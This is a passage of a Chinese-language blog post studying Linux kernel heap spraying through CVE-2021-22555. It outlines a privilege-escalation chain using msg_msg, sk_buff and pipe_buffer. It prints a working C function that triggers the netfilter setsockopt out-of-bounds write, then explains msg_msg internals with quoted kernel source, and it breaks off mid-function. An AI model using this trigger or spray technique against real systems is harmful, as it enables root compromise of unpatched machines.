@@ -1,0 +1,956 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>内核堆喷学习——CVE-2021-22555 - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="本文详细分析了使用 `msg_msg` `sk_buff` 堆喷的方式。并且简述了 CVE-2021-22555 的利用过程"><meta property="og:image" content><meta property="og:title" content="内核堆喷学习——CVE-2021-22555"><meta property="og:description" content="本文详细分析了使用 `msg_msg` `sk_buff` 堆喷的方式。并且简述了 CVE-2021-22555 的利用过程"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/pwnreview/1659.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-02-21T21:21:00+00:00"><meta property="article:modified_time" content="2023-02-21T21:21:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="内核堆喷学习——CVE-2021-22555"><meta name=twitter:description content="本文详细分析了使用 `msg_msg` `sk_buff` 堆喷的方式。并且简述了 CVE-2021-22555 的利用过程"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>内核堆喷学习——CVE-2021-22555</h1><div class=meta>Posted on Feb 21, 2023</div></div><section class=body><h2 id=总结><span class=section-num>1</span> 总结</h2><p>触发漏洞需要 <code>CPA_NET_ADMIN</code> ，我们先 <code>unshare</code> 出自己的名称空间，把权限给自己拉满</p><p>漏洞出现在内核的 netfilter 子系统，是一个防火墙系统。用户层中，iptable 即使通过该子系统实现的。</p><p>这个漏洞由 <code>setsockopt</code> 触发，在调用链中的 <code>xt_compat_target_from_user</code> 中，由于假设了一个不会对齐的 <code>data</code> 字段会 8 字节对齐，在后面进行 <code>memset</code> 对齐时，可以实现最多 7 个字节的溢出写零。这篇文章不会详细分析漏洞的成因，网络上已经有许多优秀的文章完整分析了。一下是触发漏洞的函数段，可以实现分配 kmalloc-4096 的内存块，并且溢出 2 字节写零。仅仅对于学习一些堆喷技巧来说，暂时知道这些就够了。</p><p><a id=code-snippet--triggerOob></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>triggerOob</span>(<span style=color:#902000>int</span> socket_fd) {
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// adapted from
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#60a0b0;font-style:italic>// https://github.com/google/security-research/security/advisories/GHSA-xxx5-8mvq-3528
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#06287e>__attribute__</span>((__packed__)) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> ipt_replace replace;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> ipt_entry entry;
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> xt_entry_match match;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span> pad[<span style=color:#40a070>0xFB6</span> <span style=color:#666>-</span> <span style=color:#40a070>172</span> <span style=color:#666>-</span> <span style=color:#40a070>4</span>];
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> xt_entry_target target;
+</span></span><span style=display:flex><span>  } data <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.replace.num_counters <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  data.replace.num_entries <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>  data.replace.size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span>
+</span></span><span style=display:flex><span>                      <span style=color:#007020;font-weight:700>sizeof</span>(data.pad) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.entry.next_offset <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span>
+</span></span><span style=display:flex><span>                           <span style=color:#007020;font-weight:700>sizeof</span>(data.pad) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>  data.entry.target_offset <span style=color:#666>=</span>
+</span></span><span style=display:flex><span>      <span style=color:#007020;font-weight:700>sizeof</span>(data.entry) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.pad);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.match.u.user.match_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.match) <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.pad);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>strcpy</span>(data.match.u.user.name, <span style=color:#4070a0>&#34;icmp&#34;</span>);
+</span></span><span style=display:flex><span>  data.match.u.user.revision <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data.target.u.user.target_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(data.target);
+</span></span><span style=display:flex><span>  <span style=color:#06287e>strcpy</span>(data.target.u.user.name, <span style=color:#4070a0>&#34;NFQUEUE&#34;</span>);
+</span></span><span style=display:flex><span>  data.target.u.user.revision <span style=color:#666>=</span> <span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>// partial overwrite the next object
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>setsockopt</span>(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, <span style=color:#666>&amp;</span>data, <span style=color:#007020;font-weight:700>sizeof</span>(data))) {
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (errno <span style=color:#666>==</span> ENOPROTOOPT) {
+</span></span><span style=display:flex><span>      <span style=color:#06287e>err_exit</span>(<span style=color:#4070a0>&#34;ip_tables module is not loaded!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;error: %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, errno);
+</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] setsockopt&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>将这个漏洞转换为 UAF 并最后完成利用，用到了现在 kernel 中比较常见的利用手段，也就是堆喷。而在内核中堆喷的时候，就有 <code>sk_buff</code> 和 <code>msg_msg</code> 两个比较好用的结构体。</p><p>一般对于内核中的堆溢出，我们也是想办法转为 UAF。由于内核堆分配器 slub 是一个复杂的系统，而且有 random list、xor key 等各种各样的保护措施，想要通过 slub 来利用，可谓非常困难，而且有些得不偿失。</p><p>在内核提权中，我们有对内核的较多的交互能力，所以其实可以利用内核中的结构体来辅助利用。 <code>msg_msg</code> 和 <code>sk_buff</code> 就是两个常用的结构体。</p><p>不过由于内核堆分配器存在随机性，所以往往需要进行堆喷来占位。</p><p>我们的做法就是</p><ol><li>堆喷 <code>msg_msg</code> ，让内存中出现大量连续的 <code>msg_msg</code> 结构体。</li><li>free 掉几个 <code>msg_msg</code> ，让连续的区块中出现几个空洞。</li><li>通过 <code>setsockopt</code> 占位到空洞中。通过溢出修改下一个 <code>msg_msg</code> 的 <code>m_list.next</code> 指针。此时获得两根指向同一对象的指针</li><li>free 其中一根，获得一根悬垂指针。</li><li>通过 <code>sk_buff</code> 加悬垂指针实现对 <code>pipe_buffer</code> 结构体的完全控制</li><li>通过 <code>pipe_buffer</code> 完成提权</li></ol><h2 id=msg-msg-堆喷><span class=section-num>2</span> <code>msg_msg</code> 堆喷 <span class=tag><span class=exploit_trick>exploit-trick</span></span></h2><h3 id=结构体定义><span class=section-num>2.1</span> 结构体定义</h3><p><code>msg_msg</code> 结构体在内核中用于实现 System-V IPC 中的消息队列。在内核中消息队列是一个双向链表，每个 <code>msg_msg</code> 结构体是链表中的节点，代表一个消息。结构体定义如下</p><p><a id="code-snippet--struct msg-msg"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* one msg_msg structure for each message */</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_msg {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head m_list;
+</span></span><span style=display:flex><span>        <span style=color:#902000>long</span> m_type;
+</span></span><span style=display:flex><span>        <span style=color:#902000>size_t</span> m_ts;		<span style=color:#60a0b0;font-style:italic>/* message text size */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>next;
+</span></span><span style=display:flex><span>        <span style=color:#902000>void</span> <span style=color:#666>*</span>security;
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* the actual message follows immediately */</span>
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>单个 <code>msg_msg</code> 结构体最多占一页。</p><ul><li><code>m_list</code> 是用来组成消息队列的双链表</li><li><code>m_type</code> 由用户指定，用来实现一个简单的消息优先级
+具体的，在使用 <code>msgsnd</code> 发送消息时，传入的结构为 <code>strcut {long m_type; char m_text[];}</code> ，这个 <code>m_type</code> 就会存到对应的 <code>msg_msg</code> 中，在 <code>msgrcv</code> 时也会传入一个 <code>msgtyp</code> ，对于 <code>msgtype</code> 的取值有以下三种情况<ul><li><code>msgtype == 0</code> ：返回队列中的第一个消息</li><li><code>msgtype > 0</code> ：返回队列中 <code>msg_msg->m_type == msgtype</code> 的第一个消息</li><li><code>msgtype &lt; 0</code> ：返回队列中所有满足 <code>msg_msg->m_type</code> 小于等于 <code>msgtype</code> 的消息中 <code>m_type</code> 最小的一个</li></ul></li><li><code>m_ts</code> 表示这个消息的总长度</li><li><code>security</code> 是 <code>msg_msg</code> 的安全标识符，主要用于 LSM</li></ul><p>对于结构体中类型为 <code>struct msg_msgseg*</code> 的 <code>next</code> 指针。</p><p><a id="code-snippet--struct msg-msgseg"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_msgseg {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>next;
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/* the next part of the message follows immediately */</span>
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p>这个和 <code>msg_msg</code> 类似，也是开头为元数据，之后接着用户数据。用于在单个消息大于 <code>PAGE_SIZE - sizeof(struct msg_msg)</code> （即 0xFD0）时，由于 <code>msg_msg</code> 最多只能占一页，所以多出来的数据就存储在 next 指针指向的 <code>msg_msgseg</code> 中。一个 <code>msg_msgseg</code> 最多能存 0xFF8 字节数据，如果还不够，就继续分配新的 <code>msg_msgseg</code></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>                                                             m_list.prev
+</span></span><span style=display:flex><span>                                                +----------------------------------------+
+</span></span><span style=display:flex><span>                                                |                                        |
+</span></span><span style=display:flex><span>                                                |         q_message.prev                 |
+</span></span><span style=display:flex><span>                +-------------------------------+-----------------------------+          |
+</span></span><span style=display:flex><span>                |                               v                             v          |
+</span></span><span style=display:flex><span>              +-----------+                   +---------+                   +---------+  |
+</span></span><span style=display:flex><span>              | msg_queue |  q_message.next   | msg_msg |  m_list.next      | msg_msg |  |
+</span></span><span style=display:flex><span>+-----------&gt; |    msq    | ----------------&gt; |    A    | ----------------&gt; |    B    | -+
+</span></span><span style=display:flex><span>|             +-----------+                   +---------+                   +---------+
+</span></span><span style=display:flex><span>|               ^           m_list.prev         |                             |
+</span></span><span style=display:flex><span>| m_list.next   +-------------------------------+                             |
+</span></span><span style=display:flex><span>|                                                                             |
+</span></span><span style=display:flex><span>|                                                                             |
+</span></span><span style=display:flex><span>+-----------------------------------------------------------------------------+
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>如果 A 比较大，超过了 0xFD0，就会在后面挂上 msg_msgseg，对于下面这样有两个 msg_msgseg 的情况下，消息的长度至少为 0xFD0 + 0xFF8 + 1
+</span></span><span style=display:flex><span>+---------+         +------------+         +------------+
+</span></span><span style=display:flex><span>| msg_msg |         | msg_msgseg |         | msg_msgseg |
+</span></span><span style=display:flex><span>|    A    |  next   |    seg1    |  next   |    seg2    |
+</span></span><span style=display:flex><span>|         | ------&gt; | user datas | ------&gt; | user datas |
+</span></span><span style=display:flex><span>+---------+         +------------+         +------------+
+</span></span></code></pre></div><p>结构大概就是这样。 <code>msg_queue</code> 就是用来管理单个消息队列的结构体。</p><p><a id="code-snippet--struct msg-queue"></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/* one msq_queue structure for each present queue on the system */</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_queue {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> kern_ipc_perm q_perm;
+</span></span><span style=display:flex><span>        <span style=color:#902000>time64_t</span> q_stime;		<span style=color:#60a0b0;font-style:italic>/* last msgsnd time */</span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>time64_t</span> q_rtime;		<span style=color:#60a0b0;font-style:italic>/* last msgrcv time */</span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>time64_t</span> q_ctime;		<span style=color:#60a0b0;font-style:italic>/* last change time */</span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> q_cbytes;		<span style=color:#60a0b0;font-style:italic>/* current number of bytes on queue */</span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> q_qnum;		<span style=color:#60a0b0;font-style:italic>/* number of messages in queue */</span>
+</span></span><span style=display:flex><span>        <span style=color:#902000>unsigned</span> <span style=color:#902000>long</span> q_qbytes;		<span style=color:#60a0b0;font-style:italic>/* max number of bytes on queue */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> pid <span style=color:#666>*</span>q_lspid;		<span style=color:#60a0b0;font-style:italic>/* pid of last msgsnd */</span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> pid <span style=color:#666>*</span>q_lrpid;		<span style=color:#60a0b0;font-style:italic>/* last receive pid */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head q_messages;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head q_receivers;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> list_head q_senders;
+</span></span><span style=display:flex><span>} __randomize_layout;
+</span></span></code></pre></div><p><code>msg_msg</code> 头部占位 48 byte，后面的数据由用户填充，所以通过 <code>msg_msg</code> 我们可以占位 kmalloc-64 到 kmalloc-1k 中的所有堆块。并且只有开头 48 byte 不可控。</p><h3 id=msg-的读取><span class=section-num>2.2</span> msg 的读取</h3><p>读取消息队列使用的是 <code>msgrcv</code> 系统调用。原型为</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#902000>ssize_t</span> <span style=color:#06287e>msgrcv</span>(<span style=color:#902000>int</span> msqid, <span style=color:#902000>void</span> <span style=color:#666>*</span>msgp, <span style=color:#902000>size_t</span> msgsz, <span style=color:#902000>long</span> msgtyp,
+</span></span><span style=display:flex><span>               <span style=color:#902000>int</span> msgflg);
+</span></span></code></pre></div><p><code>msqid</code> 是消息队列的 id， <code>msgtyp</code> 是前面提到的消息种类，用于实现简单的优先级。 <code>msgflg</code> 是读取的 flag，我们会用到的是 <code>MSG_COPY</code> 。</p><p>进入内核最后会调用到 <code>do_msgrcv</code> ，简单看一下他的实现</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>...
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msgflg <span style=color:#666>&amp;</span> MSG_COPY) {
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>if</span> ((msgflg <span style=color:#666>&amp;</span> MSG_EXCEPT) <span style=color:#666>||</span> <span style=color:#666>!</span>(msgflg <span style=color:#666>&amp;</span> IPC_NOWAIT))
+</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EINVAL;
+</span></span><span style=display:flex><span>                copy <span style=color:#666>=</span> <span style=color:#06287e>prepare_copy</span>(buf, <span style=color:#902000>min_t</span>(<span style=color:#902000>size_t</span>, bufsz, ns<span style=color:#666>-&gt;</span>msg_ctlmax));
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>IS_ERR</span>(copy))
+</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>PTR_ERR</span>(copy);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        mode <span style=color:#666>=</span> <span style=color:#06287e>convert_mode</span>(<span style=color:#666>&amp;</span>msgtyp, msgflg);
+</span></span><span style=display:flex><span>...
+</span></span></code></pre></div><p>如果我们在 <code>msgrcv</code> 时指定了 <code>MSG_COPY</code> 的 flag，那么开头会先进入上面的代码片段。</p><p>在这里，会调用 <code>prepare_copy</code> 做拷贝</p><p><a id=code-snippet--prepare-copy></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * This function creates new kernel message structure, large enough to store
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> * bufsz message bytes.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic> */</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span><span style=color:#06287e>prepare_copy</span>(<span style=color:#902000>void</span> __user <span style=color:#666>*</span>buf, <span style=color:#902000>size_t</span> bufsz)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>copy;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>/*
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         * Create dummy message to copy real message to.
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>         */</span>
+</span></span><span style=display:flex><span>        copy <span style=color:#666>=</span> <span style=color:#06287e>load_msg</span>(buf, bufsz);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span><span style=color:#06287e>IS_ERR</span>(copy))
+</span></span><span style=display:flex><span>                copy<span style=color:#666>-&gt;</span>m_ts <span style=color:#666>=</span> bufsz;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> copy;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><a id=code-snippet--load-msg></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span><span style=color:#06287e>load_msg</span>(<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>void</span> __user <span style=color:#666>*</span>src, <span style=color:#902000>size_t</span> len)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>msg;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>seg;
+</span></span><span style=display:flex><span>        <span style=color:#902000>int</span> err <span style=color:#666>=</span> <span style=color:#666>-</span>EFAULT;
+</span></span><span style=display:flex><span>        <span style=color:#902000>size_t</span> alen;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        msg <span style=color:#666>=</span> <span style=color:#06287e>alloc_msg</span>(len);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msg <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>ERR_PTR</span>(<span style=color:#666>-</span>ENOMEM);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        alen <span style=color:#666>=</span> <span style=color:#06287e>min</span>(len, DATALEN_MSG);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>copy_from_user</span>(msg <span style=color:#666>+</span> <span style=color:#40a070>1</span>, src, alen))
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_err;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> (seg <span style=color:#666>=</span> msg<span style=color:#666>-&gt;</span>next; seg <span style=color:#666>!=</span> <span style=color:#007020>NULL</span>; seg <span style=color:#666>=</span> seg<span style=color:#666>-&gt;</span>next) {
+</span></span><span style=display:flex><span>                len <span style=color:#666>-=</span> alen;
+</span></span><span style=display:flex><span>                src <span style=color:#666>=</span> (<span style=color:#902000>char</span> __user <span style=color:#666>*</span>)src <span style=color:#666>+</span> alen;
+</span></span><span style=display:flex><span>                alen <span style=color:#666>=</span> <span style=color:#06287e>min</span>(len, DATALEN_SEG);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>if</span> (<span style=color:#06287e>copy_from_user</span>(seg <span style=color:#666>+</span> <span style=color:#40a070>1</span>, src, alen))
+</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>goto</span> out_err;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        err <span style=color:#666>=</span> <span style=color:#06287e>security_msg_msg_alloc</span>(msg);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (err)
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>goto</span> out_err;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> msg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out_err</span>:
+</span></span><span style=display:flex><span>        <span style=color:#06287e>free_msg</span>(msg);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>ERR_PTR</span>(err);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><a id=code-snippet--alloc-msg></a></p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span><span style=color:#06287e>alloc_msg</span>(<span style=color:#902000>size_t</span> len)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msg <span style=color:#666>*</span>msg;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>**</span>pseg;
+</span></span><span style=display:flex><span>        <span style=color:#902000>size_t</span> alen;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        alen <span style=color:#666>=</span> <span style=color:#06287e>min</span>(len, DATALEN_MSG);
+</span></span><span style=display:flex><span>        msg <span style=color:#666>=</span> <span style=color:#06287e>kmalloc</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>msg) <span style=color:#666>+</span> alen, GFP_KERNEL_ACCOUNT);
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (msg <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        msg<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>        msg<span style=color:#666>-&gt;</span>security <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        len <span style=color:#666>-=</span> alen;
+</span></span><span style=display:flex><span>        pseg <span style=color:#666>=</span> <span style=color:#666>&amp;</span>msg<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>while</span> (len <span style=color:#666>&gt;</span> <span style=color:#40a070>0</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>struct</span> msg_msgseg <span style=color:#666>*</span>seg;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#06287e>cond_resched</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                alen <span style=color:#666>=</span> <span style=color:#06287e>min</span>(len, DATALEN_SEG);
+</span></span><span style=display:flex><span>                seg <span style=color:#666>=</span> <span style=color:#06287e>kmalloc</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#666>*</span>seg) <span style=color:#666>+</span> alen, GFP_KERNEL_ACCOUNT);
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>if</span> (seg <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
+</span></span><span style=display:flex><span>                        <span style=color:#007020;font-weight:700>goto</span> out_err;
+</span></span><span style=display:flex><span>                <span style=color:#666>*</span>pseg <span style=color:#666>=</span> seg;
+</span></span><span style=display:flex><span>                seg<span style=color:#666>-&gt;</span>next <span style=color:#666>=</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>                pseg <span style=color:#666>=</span> <span style=color:#666>&amp;</span>seg<span style=color:#666>-&gt;</span>next;
+</span></span><span style=display:flex><span>                len <span style=color:#666>-=</span> alen;
+</span></span><span style=display:flex><span>        }
